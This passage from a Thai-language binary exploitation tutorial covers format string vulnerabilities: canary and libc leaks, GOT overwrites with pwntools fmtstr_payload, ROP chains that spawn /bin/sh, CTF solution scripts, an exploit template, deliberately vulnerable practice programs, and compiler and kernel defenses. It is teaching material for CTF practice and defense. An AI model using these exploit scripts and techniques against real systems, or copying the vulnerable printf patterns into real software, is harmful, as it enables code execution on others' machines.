            if (potential_canary & 0xFF) == 0:
                print(f"[+] Potential canary at offset {offset}: {hex(potential_canary)}")
    except:
        pass
    
    p.close()
```

### ขั้นตอน Bypass Canary

```
1. Leak canary ด้วย format string
2. หา offset ของ canary ใน buffer overflow
3. ใส่ canary ที่ถูกต้องลงใน buffer overflow payload
4. รัน exploit ปกติ (BOF + ROP)
```

```python
#!/usr/bin/env python3
from pwn import *

binary = './vuln_canary'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# ขั้นตอน 1: Leak canary
canary_fmt_offset = 11
p.sendline(f"%{canary_fmt_offset}$p".encode())
canary_raw = p.recvline().strip()
canary = int(canary_raw, 16)
log.info(f"Leaked canary: {hex(canary)}")

# ขั้นตอน 2: Leak libc
libc_fmt_offset = 13
p.sendline(f"%{libc_fmt_offset}$p".encode())
libc_raw = p.recvline().strip()
libc_leak = int(libc_raw, 16)
libc_base = libc_leak - libc.symbols['__libc_start_main'] - 243
log.info(f"libc base: {hex(libc_base)}")

# ขั้นตอน 3: Build ROP chain
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
ret = libc_base + next(libc.search(asm('ret')))
pop_rdi = libc_base + next(libc.search(asm('pop rdi; ret')))

# ขั้นตอน 4: Buffer overflow ด้วย canary ที่ถูกต้อง
buf_size = 72     # ขนาด buffer ก่อน canary
padding = b'A' * buf_size
rop = p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
payload = padding + p64(canary) + p64(0) + rop

p.sendline(payload)
p.interactive()
```

---

## 16. Heap-based Format String

### เมื่อ Format String อยู่บน Heap

บางครั้ง vulnerable buffer อยู่บน heap ไม่ใช่ stack:

```c
char *buf = malloc(256);
fgets(buf, 256, stdin);
printf(buf);  // format string อยู่บน heap
free(buf);
```

### ความแตกต่างจาก Stack-based

1. **Offset ต่างกัน**: format string ไม่อยู่บน stack โดยตรง
2. **ต้องการ heap pointer**: ต้องหา pointer บน stack ที่ชี้ไป heap
3. **ซับซ้อนกว่า**: อาจต้องทำ multiple stages

### การหา Heap Address

```python
# ส่ง format string เพื่อ leak heap address
p.sendline(b"%p." * 30)
output = p.recvall()

# วิเคราะห์ output เพื่อหา heap addresses
# heap addresses มักขึ้นต้นด้วย 0x5 หรือ 0x6 ใน ASLR
```

### ตัวอย่าง Heap-based Attack

```python
#!/usr/bin/env python3
from pwn import *

binary = './heap_fmt'
elf = ELF(binary)

p = process(binary)

# ขั้นตอน 1: Leak stack/heap addresses
p.sendline(b"%p." * 20)
leaks = p.recvline().split(b".")

print("Leaked values:")
for i, leak in enumerate(leaks):
    try:
        val = int(leak, 16)
        print(f"  %{i+1}$p = {hex(val)}")
    except:
        pass

# ขั้นตอน 2: หา pointer ที่ชี้ไป heap
# ... วิเคราะห์ค่าที่ leak ได้

# ขั้นตอน 3: ใช้ double pointer technique ถ้าจำเป็น
```

### Double Pointer Technique

เมื่อต้องการเขียนไปยัง arbitrary address ผ่าน pointer ที่อยู่บน stack:

```
Stack:
[offset 6] → pointer_A → buffer_on_heap

เราสามารถ:
1. เขียนไปยัง pointer_A ด้วย %6$n
2. ทำให้ pointer_A ชี้ไปยัง target address
3. เขียนไปยัง target ผ่าน pointer ที่เพิ่งแก้
```

---

## 17. Defense Mechanisms

### 1. -Wformat-security Flag

```bash
# Compile ด้วย warning
gcc -Wformat -Wformat-security -o safe_program program.c

# Output:
# program.c:10:5: warning: format not a string literal and no format arguments [-Wformat-security]
#    printf(user_input);
```

### 2. -Werror=format-security

```bash
# ทำให้เป็น error (ไม่แค่ warning)
gcc -Wall -Wformat-security -Werror=format-security -o program program.c
```

### 3. Static Analysis Tools

```bash
# Clang Static Analyzer
clang --analyze program.c

# Fortify Source
gcc -D_FORTIFY_SOURCE=2 -O2 program.c

# CodeQL, Coverity, etc.
```

### 4. Format String Sanitization

```c
// Safe alternatives to printf(user_input):

// Option 1: Always provide format string
printf("%s", user_input);
fputs(user_input, stdout);

// Option 2: Validate input
int is_safe_format(const char *s) {
    while (*s) {
        if (*s == '%') return 0;  // ง่ายแต่อาจ restrictive เกินไป
        s++;
    }
    return 1;
}

// Option 3: Escape percent signs
char *sanitize_format(const char *input) {
    // แทน % ด้วย %%
    // ...
}
```

### 5. FORTIFY_SOURCE

`_FORTIFY_SOURCE=2` เพิ่ม runtime checks สำหรับ format strings:

```bash
gcc -D_FORTIFY_SOURCE=2 -O1 -o program program.c
```

ตรวจสอบ:
- Format string ไม่ใช่ string literal
- `%n` ใน format string ที่ไม่อยู่ใน read-only section

### 6. Stack Protection (Canary)

```bash
# เพิ่ม stack canary
gcc -fstack-protector-all -o program program.c

# สำหรับ stronger protection
gcc -fstack-protector-strong -o program program.c
```

### 7. RELRO (Relocation Read-Only)

```bash
# Full RELRO: ทำให้ GOT เป็น read-only
gcc -Wl,-z,relro,-z,now -o program program.c

# ตรวจสอบ
checksec --file=program
```

### 8. ASLR (Address Space Layout Randomization)

```bash
# เปิดใน kernel
echo 2 > /proc/sys/kernel/randomize_va_space

# ตรวจสอบ
cat /proc/sys/kernel/randomize_va_space
```

### สรุป Defense Checklist

```
[ ] ใช้ format string literal เสมอ
[ ] ใช้ -Wformat-security ในการ compile
[ ] เปิดใช้ FORTIFY_SOURCE
[ ] เปิดใช้ Stack Canary
[ ] เปิดใช้ Full RELRO
[ ] เปิดใช้ ASLR
[ ] ใช้ Static Analysis Tools
[ ] Code Review เพื่อหา printf(user_input) patterns
```

---

## 18. pwntools: fmtstr_payload

### การติดตั้ง pwntools

```bash
pip install pwntools
# หรือ
pip3 install --upgrade pwntools
```

### FmtStr Class

pwntools มี `FmtStr` class สำหรับจัดการ format string exploits:

```python
from pwn import *

# สร้าง FmtStr object
fmt = FmtStr(execute_fmt, offset=N)

# execute_fmt เป็น function ที่รับ payload และส่งคืน output
```

### fmtstr_payload Function

```python
from pwn import *

# Syntax
payload = fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')

# Parameters:
# offset      - format string offset บน stack
# writes      - dict: {target_address: value_to_write}
# numbwritten - จำนวน chars ที่พิมพ์ไปแล้วก่อน payload นี้
# write_size  - 'byte', 'short', หรือ 'int'
```

### ตัวอย่างใช้งาน fmtstr_payload

```python
#!/usr/bin/env python3
from pwn import *

binary = './vuln'
elf = ELF(binary)
libc = ELF('./libc.so.6')

p = process(binary)

# สมมติว่าหา libc base ได้แล้ว
libc_base = 0xb75e2000
system = libc_base + libc.symbols['system']

# Target: overwrite puts@GOT ด้วย system
puts_got = elf.got['puts']
offset = 7  # format string offset

# ใช้ fmtstr_payload
writes = {puts_got: system}
payload = fmtstr_payload(offset, writes, write_size='short')

print(f"Payload length: {len(payload)}")
print(f"Payload: {payload}")

p.sendline(payload)
p.sendline(b"/bin/sh")  # argument สำหรับ system()
p.interactive()
```

### ตัวอย่าง FmtStr Class (Automatic)

```python
#!/usr/bin/env python3
from pwn import *

binary = './vuln'
elf = ELF(binary)

def send_fmt(payload):
    """Function ที่ส่ง payload และรับ response"""
    p = process(binary)
    p.recvuntil(b"Input: ")
    p.send(payload)
    result = p.recvline()
    p.close()
    return result

# FmtStr จะทดสอบ offsets อัตโนมัติ
fmt = FmtStr(send_fmt)
print(f"Found offset: {fmt.offset}")

# เขียน arbitrary value
target_addr = elf.got['puts']
target_val = elf.plt['system']

fmt.write(target_addr, target_val)
fmt.execute_writes()
```

### ตัวอย่างขั้นสูง: Multiple Writes

```python
#!/usr/bin/env python3
from pwn import *

binary = './vuln_multi'
elf = ELF(binary)
libc = ELF('./libc.so.6')

p = process(binary)

libc_base = 0xb7500000  # สมมติว่าหาได้แล้ว
system = libc_base + libc.symbols['system']

# Overwrite หลาย GOT entries พร้อมกัน
writes = {
    elf.got['puts']:    system,
    elf.got['printf']:  system,
    elf.got['exit']:    system,
}

offset = 7
payload = fmtstr_payload(offset, writes)

p.sendline(payload)
p.interactive()
```

### fmtstr_payload พร้อม offset calculation

```python
# ถ้ายังไม่รู้ offset
from pwn import *

def find_offset_and_exploit():
    binary = './vuln'
    elf = ELF(binary)
    
    def exec_fmt(payload):
        p = process(binary)
        p.sendline(payload)
        data = p.recvall()
        p.close()
        return data
    
    # หา offset อัตโนมัติ
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    
    log.info(f"Offset: {offset}")
    
    # ใช้ exploit
    target_addr = elf.got['puts']
    target_val = elf.symbols['win']
    
    payload = fmtstr_payload(offset, {target_addr: target_val})
    
    p = process(binary)
    p.sendline(payload)
    p.interactive()

find_offset_and_exploit()
```

---

## 19. CTF Examples and Practice

### Challenge 1: Classic printf Vulnerability (32-bit)

```c
// Source code ของ challenge
#include <stdio.h>
#include <string.h>

void win() {
    system("/bin/sh");
}

int main() {
    char buf[128];
    puts("Give me input: ");
    fgets(buf, 128, stdin);
    printf(buf);  // VULNERABLE
    return 0;
}
```

**วิธีแก้:**

```python
#!/usr/bin/env python3
from pwn import *

binary = './challenge1'
elf = ELF(binary)

p = process(binary)

# หา offset
win_addr = elf.symbols['win']
printf_got = elf.got['printf']
offset = 7

log.info(f"win() = {hex(win_addr)}")
log.info(f"printf@GOT = {hex(printf_got)}")

# สร้าง payload
payload = fmtstr_payload(offset, {printf_got: win_addr})

p.recvuntil(b"Give me input: \n")
p.sendline(payload)
p.interactive()
```

### Challenge 2: Leak and Exploit (64-bit with ASLR)

```c
// challenge2.c
#include <stdio.h>
#include <stdlib.h>

void vuln() {
    char buf[64];
    printf("Enter text: ");
    fgets(buf, 64, stdin);
    printf(buf);  // VULNERABLE
    
    printf("Again: ");
    fgets(buf, 64, stdin);
    printf(buf);  // VULNERABLE AGAIN
}

int main() {
    vuln();
    return 0;
}
```

**วิธีแก้:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

binary = './challenge2'
elf = ELF(binary)
libc = ELF('./libc.so.6')

p = process(binary)

# ขั้นตอน 1: Leak libc address
offset = 6  # ต้องหาก่อน

p.recvuntil(b"Enter text: ")

# Leak __libc_start_main+243 จาก stack
# ค่า offset ขึ้นกับ binary
leak_payload = f"%{offset+2}$p".encode()
p.sendline(leak_payload)

leaked = int(p.recvline().strip(), 16)
libc_base = leaked - 0x21b97  # offset ของ __libc_start_main+243

log.info(f"Leaked: {hex(leaked)}")
log.info(f"libc base: {hex(libc_base)}")

system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# ขั้นตอน 2: Overwrite GOT
p.recvuntil(b"Again: ")

puts_got = elf.got['puts']
payload = fmtstr_payload(offset, {puts_got: system})

p.sendline(payload)

# ขั้นตอน 3: Trigger puts("/bin/sh")
# ... ขึ้นกับ program flow

p.interactive()
```

### Challenge 3: Format String + Buffer Overflow (Canary Bypass)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './challenge3'
elf = ELF(binary)
libc = ELF('./libc.so.6')

p = process(binary)

# ขั้นตอน 1: Leak canary ด้วย format string
p.sendline(b"%11$p")  # offset ของ canary

canary = int(p.recvline().strip(), 16)
log.info(f"Canary: {hex(canary)}")

# ขั้นตอน 2: Leak libc
p.sendline(b"%13$p")  # offset ของ return address
ret_addr = int(p.recvline().strip(), 16)

libc_base = ret_addr - 0x21b97
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi = libc_base + next(libc.search(asm('pop rdi; ret')))
ret_gadget = libc_base + next(libc.search(asm('ret')))

log.info(f"libc base: {hex(libc_base)}")
log.info(f"system: {hex(system)}")

# ขั้นตอน 3: Buffer overflow ด้วย canary ที่ถูกต้อง
buf_size = 72

payload = b'A' * buf_size
payload += p64(canary)
payload += p64(0)           # saved rbp
payload += p64(ret_gadget)  # alignment
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

### Challenge 4: Blind Format String (No Output)

บางครั้งโปรแกรมไม่แสดงผล แต่ยังมีช่องโหว่ format string:

```python
#!/usr/bin/env python3
from pwn import *

# ในกรณีที่ไม่มี output:
# ใช้ %n เพื่อเขียนโดยตรงโดยไม่ต้อง leak

binary = './blind_fmt'
elf = ELF(binary)

# หา PLT/GOT addresses (static, ไม่เปลี่ยนถ้าไม่มี PIE)
puts_got = elf.got['puts']

# Target: shellcode หรือ ROP gadget ที่รู้ address แล้ว
# (ต้องการ ASLR ปิด หรือ partial overwrite)

win_addr = 0x08048700  # สมมติค่า

offset = 7

# เขียน win_addr ไปที่ puts@GOT
payload = fmtstr_payload(offset, {puts_got: win_addr})

p = process(binary)
p.sendline(payload)
p.interactive()
```

### Tips สำหรับ CTF

```
1. ตรวจสอบ binary ก่อน
   checksec --file=./chall
   file ./chall
   strings ./chall | grep -i flag

2. หา vulnerable functions
   objdump -d ./chall | grep -A5 "printf\|sprintf\|fprintf"

3. ตรวจสอบ protections
   - No PIE + No RELRO: GOT overwrite ง่าย
   - PIE + No canary: Leak then BOF
   - Full protection: ต้องใช้หลาย techniques

4. Dynamic analysis
   ltrace ./chall  # trace library calls
   strace ./chall  # trace system calls
   
5. GDB with PEDA/pwndbg/GEF
   pattern create 200
   pattern offset [value]
```

---

## 20. Summary and Cheat Sheet

### Format String Cheat Sheet

```
การ READ:
%x    - read 4 bytes (hex)
%p    - read pointer
%s    - read string at address
%N$x  - read N-th argument (direct access)
%N$p  - read N-th argument as pointer

การ WRITE:
%n    - write chars_printed to *arg
%hn   - write 2 bytes
%hhn  - write 1 byte
%ln   - write 4/8 bytes
%lln  - write 8 bytes
%Nc   - print N chars (ใช้สำหรับควบคุมค่าที่เขียน)

Direct Access:
%N$   - access argument ที่ N โดยตรง
        เช่น %7$x, %7$n, %7$s
```

### Algorithm การ Exploit

```
1. ตรวจสอบ: printf(user_input)?
2. หา offset: AAAA%1$x จนกว่าเห็น 41414141
3. เป้าหมาย?
   a. Leak: %N$p/%N$s
   b. Write: fmtstr_payload / manual %hn
4. ถ้ามี ASLR: ต้อง leak libc base ก่อน
5. ถ้ามี Canary: ต้อง leak canary ก่อน
6. ถ้ามี Full RELRO: ไม่สามารถ overwrite GOT
```

### pwntools Reference

```python
from pwn import *

# Load binary
elf = ELF('./binary')
libc = ELF('./libc.so.6')

# Process
p = process('./binary')
p = remote('ctf.example.com', 1337)

# Format string payload
payload = fmtstr_payload(offset, {addr: value})
payload = fmtstr_payload(offset, {addr: value}, write_size='byte')
payload = fmtstr_payload(offset, {addr: value}, numbwritten=N)

# Auto-find offset
fmt = FmtStr(exec_func)
offset = fmt.offset

# Pack/unpack
p32(value)   # little-endian 32-bit
p64(value)   # little-endian 64-bit
u32(data)    # unpack 32-bit
u64(data)    # unpack 64-bit
```

### Common GOT Targets

```
puts@GOT  → system("/bin/sh")
printf@GOT → system("/bin/sh")  
exit@GOT   → one_gadget
free@GOT   → system (ถ้า free(ptr) เรียกพร้อม ptr="/bin/sh")
```

### One-Liners สำหรับ Reconnaissance

```bash
# Check binary protections
checksec --file=./binary

# Find format string vulns in disasm
objdump -d ./binary | grep -B2 "call.*printf"

# Find useful strings
strings ./binary | grep -E "/bin/sh|system|flag"

# Find GOT entries
objdump -R ./binary

# Libc version
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"
```

### GDB Commands ที่มีประโยชน์

```bash
# ดู stack เมื่อ printf ถูกเรียก
(gdb) break printf
(gdb) commands
> x/30xg $rsp  # 64-bit
> continue
> end

# ดู GOT table
(gdb) info got

# ดู format string บน stack
(gdb) x/s $rdi  # format string อยู่ใน RDI (64-bit)
(gdb) x/s $esp  # หรืออ่านจาก ESP (32-bit)

# Search สำหรับ pattern
(gdb) find $esp, $esp+1000, 0x41414141
```

### Exploit Template

```python
#!/usr/bin/env python3
"""
Format String Exploit Template
Target: [binary_name]
Protections: [None/NX/PIE/ASLR/Canary/RELRO]
"""

from pwn import *

# Configuration
context.arch = 'amd64'  # หรือ 'i386'
context.log_level = 'info'

binary = './target'
elf = ELF(binary)
# libc = ELF('./libc.so.6')

# Connection
p = process(binary)
# p = remote('ctf.example.com', 1337)

# Variables
offset = 0  # หา offset ก่อน

# ===== STEP 1: Find offset =====
# Uncomment เพื่อหา offset
# for i in range(1, 30):
#     p = process(binary)
#     p.sendline(f'AAAA%{i}$x'.encode())
#     data = p.recvall(timeout=0.5)
#     p.close()
#     if b'41414141' in data:
#         print(f'Offset: {i}')
#         break

# ===== STEP 2: Leak =====
# payload_leak = ...
# p.sendline(payload_leak)
# leaked = ...

# ===== STEP 3: Write =====
# payload_write = fmtstr_payload(offset, {target: value})
# p.sendline(payload_write)

# ===== STEP 4: Trigger =====
# p.sendline(b'/bin/sh')
p.interactive()
```

---

## Appendix A: Environment Setup สำหรับ Practice

### ติดตั้ง Tools

```bash
# Install pwntools
pip3 install pwntools

# Install pwndbg (GDB enhancement)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Install checksec
apt-get install checksec

# Install glibc-source (สำหรับ libc symbols)
apt-get install libc6-dbg

# Install ROPgadget
pip3 install ropgadget
```

### ปิด Protections สำหรับ Practice

```bash
# ปิด ASLR
echo 0 > /proc/sys/kernel/randomize_va_space

# Compile โดยไม่มี protections
gcc -o vuln vuln.c \
    -fno-stack-protector \    # ปิด canary
    -no-pie \                  # ปิด PIE
    -z norelro \               # ปิด RELRO
    -z execstack               # เปิด executable stack (สำหรับ shellcode)
```

### ตรวจสอบ Protections

```bash
checksec --file=./vuln
# Output:
# RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
# No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   80 Symbols        No    0               1               ./vuln
```

---

## Appendix B: ตัวอย่าง Vulnerable Programs สำหรับ Practice

### Program 1: Basic Format String

```c
// basic_fmt.c
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("You found the secret!\n");
    system("/bin/sh");
}

int main() {
    char buf[100];
    printf("Input: ");
    fgets(buf, 100, stdin);
    printf(buf);  // VULNERABLE
    return 0;
}
```

```bash
# Compile
gcc -o basic_fmt basic_fmt.c -fno-stack-protector -no-pie -z norelro
```

### Program 2: Format String with Secret Variable

```c
// secret_var.c
#include <stdio.h>

int secret = 0;

int main() {
    char buf[100];
    
    printf("Enter input: ");
    fgets(buf, 100, stdin);
    printf(buf);  // VULNERABLE
    
    if (secret == 0xdeadbeef) {
        printf("You win!\n");
        system("/bin/sh");
    }
    
    return 0;
}
```

### Program 3: 64-bit Format String

```c
// fmt64.c
#include <stdio.h>
#include <stdlib.h>

void win() {
    printf("Win!\n");
    execve("/bin/sh", NULL, NULL);
}

int main() {
    char buf[64];
    fgets(buf, 64, stdin);
    printf(buf);  // VULNERABLE
    puts("Done.");
    return 0;
}
```

```bash
# Compile 64-bit
gcc -o fmt64 fmt64.c -fno-stack-protector -no-pie -z norelro
```

---

## Appendix C: Libc Offsets และการหา One-Gadget

### การหา libc version

```bash
# ดู version
ldd ./binary
strings ./libc.so.6 | grep "GNU C"

# ใช้ libc-database
git clone https://github.com/niklasb/libc-database
cd libc-database
./get ubuntu  # download ubuntu libc versions
./find puts 0xXXXX  # หา libc จาก leaked address offset
```

### One-Gadget (Magic Gadget)

```bash
# Install one_gadget
gem install one_gadget

# หา one_gadget ใน libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Output ประมาณนี้:
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL
# 
# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL
```

```python
# ใช้ one_gadget ใน exploit
libc_base = 0x7ffff7a0d000  # หาจาก leak

# offset จาก one_gadget tool
one_gadget_offset = 0xe3afe
one_gadget = libc_base + one_gadget_offset

# Overwrite return address หรือ GOT ด้วย one_gadget
```

---

## Appendix D: Debugging Format String Exploits

### GDB Commands สำหรับ Debug

```bash
# Start GDB
gdb -q ./vuln

# ใน GDB
(gdb) set disassembly-flavor intel
(gdb) break main

# หลัง run
(gdb) disas main
(gdb) x/30i $rip

# ดู format string arguments
(gdb) break printf
(gdb) run < payload.bin
(gdb) x/s $rdi    # format string
(gdb) x/20gx $rsp  # stack (64-bit)
```

### ใช้ ltrace

```bash
# ตรวจสอบ library calls
ltrace ./vuln < payload.bin

# Output:
# printf("AAAA%08x.%08x...")  = ...
```

### Debug ด้วย Python + GDB

```python
# ใน pwntools
from pwn import *

p = gdb.debug('./vuln', '''
    break printf
    continue
''')

p.sendline(b"AAAA%x%x%x")
p.interactive()
```

### วิเคราะห์ Payload ที่ Fail

```python
# Debug payload length
payload = fmtstr_payload(offset, {target: value})
print(f"Payload length: {len(payload)}")
print(f"Payload hex: {payload.hex()}")

# ตรวจสอบว่า buffer รับได้พอไหม
buf_size = 128
if len(payload) > buf_size:
    print(f"WARNING: Payload too large! {len(payload)} > {buf_size}")
```

---

## References และแหล่งเรียนรู้เพิ่มเติม

### หนังสือและบทความ

- "The Art of Exploitation" by Jon Erickson - บท Format String
- "Hacking: The Art of Exploitation" - ตัวอย่าง format string exploits
- "Format String Attacks" by scut/team teso (paper)
- "Exploiting Format String Vulnerabilities" - phrack magazine

### Online Resources

- LiveOverflow YouTube Channel - Binary Exploitation Series
- pwn.college - Interactive pwn challenges
- exploit.education - Practice VMs
- CTFtime.org - CTF competitions
- PicoCTF - Beginner friendly CTFs

### Tools

- **pwntools**: https://github.com/Gallopsled/pwntools
- **pwndbg**: https://github.com/pwndbg/pwndbg
- **GEF** (GDB Enhanced Features): https://github.com/hugsy/gef
- **checksec**: https://github.com/slimm609/checksec.sh
- **one_gadget**: https://github.com/david942j/one_gadget
- **libc-database**: https://github.com/niklasb/libc-database
- **ROPgadget**: https://github.com/JonathanSalwan/ROPgadget

### CTF Platform สำหรับฝึกฝน

- **pwn.college**: https://pwn.college
- **HackTheBox**: https://hackthebox.com
- **TryHackMe**: https://tryhackme.com
- **exploit.education**: https://exploit.education
- **OverTheWire** (Narnia, Leviathan): https://overthewire.org

---

> **สรุป**: Format String Vulnerabilities เป็นช่องโหว่ที่เกิดจากการใช้ `printf(user_input)` แทนที่จะเป็น `printf("%s", user_input)` ช่องโหว่นี้อนุญาตให้ผู้โจมตีอ่านและเขียนข้อมูลในหน่วยความจำได้อย่างอิสระ ซึ่งสามารถนำไปสู่การรันโค้ดโดยไม่ได้รับอนุญาต วิธีป้องกันที่ดีที่สุดคือการใช้ format string literal เสมอ และใช้ compiler flags เช่น `-Wformat-security` เพื่อตรวจจับปัญหาเหล่านี้ตั้งแต่ขั้นตอน development

> **Educational Purpose Only**: ความรู้ในเอกสารนี้มีไว้เพื่อการศึกษา การทดสอบระบบที่ได้รับอนุญาต และการแข่งขัน CTF เท่านั้น
